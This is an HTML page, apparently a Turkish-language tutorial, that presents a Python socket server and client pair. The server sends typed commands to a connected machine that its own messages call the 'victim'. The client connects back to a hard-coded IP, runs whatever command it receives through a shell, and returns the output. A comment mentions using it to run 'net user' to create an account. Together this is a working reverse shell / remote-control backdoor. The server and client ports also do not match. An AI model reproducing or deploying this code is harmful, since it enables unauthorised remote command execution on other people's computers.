<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, user-scalable=no" />
  <title>Python Socket</title>
  <link rel="stylesheet" type="text/css" href="/assets/main-dark.css">
</head>
<body>
    <div class="container" style="max-width:100%;height:auto;">
<header>
  <div class="menu">


<span style="background:#008000">"Bağlantı testi için server.py"</span></br>
 
####################################################################
Gelen veriyi işlemek ve cmd komutlarını çalıştırmak   server.py  ##
####################################################################

<span style="background:#8600b3">host="192.168.1.31"
<span style="background:#8600b3">port=20000
<span style="background:#8600b3">s=socket.socket()

<span style="background:#8600b3">def bagla():
<span style="background:#8600b3">    try:
<span style="background:#8600b3">        s.bind((host,port))
<span style="background:#8600b3">        s.listen()

<span style="background:#8600b3">    except:
<span style="background:#8600b3">        print("baglantı hatası")
<span style="background:#8600b3">        bagla()

<span style="background:#8600b3">def kabul_et():
<span style="background:#8600b3">    print("Baglantı bekleniyor")
<span style="background:#8600b3">    baglanti,adres=s.accept()
<span style="background:#8600b3">    print("Bağlantı gerçekleşti kurban ip:",adres[0],"kurban port:",adres[1])
<span style="background:#8600b3">    komut_yolla(baglanti)
<span style="background:#8600b3">    baglanti.close() #serverdan "quit" girersen while döngüsü break olacak ve bu satıra gelecek,daha sonra baglanti kapanacak
    

#serverdan cliente veri(komut) yollamak için sonsuz döngülü bi blok yaratalım
<span style="background:#8600b3">def komut_yolla(baglanti):
<span style="background:#8600b3">    while True:
<span style="background:#8600b3">        cmd=input("Komut gir:")
<span style="background:#8600b3">        if cmd=="quit":  # eğer quit girmişsem döngüyü sonlandır
<span style="background:#8600b3">            break #eğer serverdan "quit" girersen komut_yolla() fonksiyonundan çıkması için break kullanıldı

<span style="background:#8600b3">        if len(cmd)>0:
            #serverdan girdiğim veriyi cliente yollayacağım
            #cmd girdisini stringden alıp byte a dönüştürmem gerekiyor
            #yani biz soket üzerinde veri alıp yollarken bunu bytelar üzerinden yapıyoruz
            #serverdan cliente veriyi yollarken "baglati" değişkeni üzerinden yollarız
            #Cünkü "baglanti" benim client ile ilişkimi temsil ediyor
<span style="background:#8600b3">            baglanti.send(cmd.encode("utf-8"))
<span style="background:#8600b3">            cevap=baglanti.recv(4096).decode("utf-8")
<span style="background:#8600b3">            print(cevap)
            
<span style="background:#8600b3">bagla()
<span style="background:#8600b3">kabul_et()

########################################################################################################################################################
########################################################################################################################################################

####################################################################
#Gelen veriyi işlemek ve cmd komutlarını çalıştırmak   client.py  ##
####################################################################



<span style="background:#8600b3">import socket
<span style="background:#8600b3">import os
<span style="background:#8600b3">import subprocess
<span style="background:#8600b3">s=socket.socket()

<span style="background:#8600b3">s.connect(("192.168.1.31",15555))

<span style="background:#8600b3">while True:
<span style="background:#8600b3">    veri=s.recv(1024)
<span style="background:#8600b3">    if veri[:2].decode("utf-8")=="cd":
<span style="background:#8600b3">        try:
<span style="background:#8600b3">            os.chdir(veri[3:].decode("utf-8"))
<span style="background:#8600b3">            s.send(os.getcwd().encode("utf-8"))           
<span style="background:#8600b3">        except FileNotFoundError:
<span style="background:#8600b3">            s.send("Dosya bulunamadı...".encode("utf-8"))
<span style="background:#8600b3">    else:

<span style="background:#8600b3">        if len(veri)>0:
            #eğer serverdan bir girdi varsa

            #serverdan girilen komutları komut sisteminde çalıştırabilmek için
            #subprocess adlı modülü çalıştırmak gerekiyor,bu modül sayesinde
            #hem serverdan girilen komutları komut sisteminde çalıştırabileceğiz
            #hemde çıktıyı servera yollayabileceğiz.
            #subprocess modülünün Popen() clasını kullanacağız
<span style="background:#8600b3">            cmd=subprocess.Popen(veri.decode("utf-8"),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            #komut sisteminin arka planında çalışacak
            #2.parametre shell=True,komut sisteminde bu komutu çalıştırmaya izin verecek
            #stdout ve stderr ı okuyup server a yollamamız lazım
<span style="background:#8600b3">            output=cmd.stdout.read() + cmd.stderr.read()
            #output ı string e dönüştürelim
<span style="background:#8600b3">            output_str=str(output,encoding="cp857")  #####------------------------------------------------>>>>> utf-8 değil cp857 yapılacak nokta
            #her komutu çalıştırdıktan sonra karşı tarafa bulunduğumuz dizini yollamak istiyorum
<span style="background:#8600b3">            konum=os.getcwd() #string formatında olduğumuz dizini veriyor
            #Ben bu ikisini yani "output" ve "konum"  u birleştirip server a yollamak istiyorum
            #1. parametre toplanacak stringler  2.parametre hangi biçimde kodlayacağımızı belirtiyoruz
<span style="background:#8600b3">            s.send(str.encode(output_str+"\n"+konum,encoding="utf-8"))

            #komut a "net user nuri 12345" yazdın izin vermedi ve türkçe çıktı verdi bu utf8 ile kodlanmamıştır cp857 ile kodlanmıştır
            #net user nuri 12345 komutunu serverdan yazdıktan sonra benim client çöküyor UnicodeDecodeError hatası alıyoruz bunu
            #almamamız için cp857 yapmam gerekiyor
 
  

<span style="background:#8600b3">s.close()</span></br>

  
<p style="color:MediumSeaGreen;">Kaynak kod:<a href="https://github.com/nuriyavuz/PythonSocketTest">https://github.com/nuriyavuz/PythonSocketTest</a></p>

</br>
</br>
  </div>
</header>
